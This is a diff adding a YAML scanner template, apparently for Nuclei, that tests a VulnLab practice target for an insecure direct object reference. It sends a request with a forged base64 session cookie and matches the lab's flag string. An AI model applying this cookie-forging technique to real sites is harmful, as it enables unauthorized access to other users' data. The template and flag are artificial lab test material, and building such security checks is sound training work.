@@ -1,0 +1,22 @@
+id: vulnlab-idor-session-medium
+
+info:
+  name: VulnLab 会话凭据 medium 档（base64 uid 可伪造）
+  author: hediwen
+  severity: high
+  tags: vulnlab,idor
+
+http:
+  - raw:
+      - |
+        GET /idor-session/medium.php?order_id=1003 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: sid=Mw==
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "VULNLAB{session_credential_unverified}"
